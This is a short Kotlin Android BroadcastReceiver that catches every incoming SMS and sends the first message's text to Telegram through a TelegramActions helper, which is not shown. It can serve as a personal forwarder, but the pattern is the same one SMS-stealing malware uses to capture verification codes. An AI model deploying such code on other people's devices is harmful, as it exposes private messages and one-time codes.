package dev.dizel.smsreceiver


import android.content.Intent

import android.content.BroadcastReceiver
import android.content.Context
import android.widget.Toast

import android.util.Log

import android.os.Build

import android.os.Bundle
import android.telephony.gsm.SmsMessage


class MySMSBroadcastReceiver : BroadcastReceiver() {


    private val SMS_RECEIVED = "android.provider.Telephony.SMS_RECEIVED"

    override fun onReceive(context: Context?, intent: Intent) {
        if (intent.action === SMS_RECEIVED) {
            val bundle = intent.extras
            if (bundle != null) {
                val pdus = bundle["pdus"] as Array<*>?
                val messages = arrayOfNulls<SmsMessage>(
                    pdus!!.size
                )
                for (i in pdus.indices) {
                    messages[i] = SmsMessage.createFromPdu(pdus[i] as ByteArray)
                }
                if (messages.size > -1) {
                    TelegramActions().sendMessage(messages[0]!!.messageBody)
                }
            }
        }
    }
}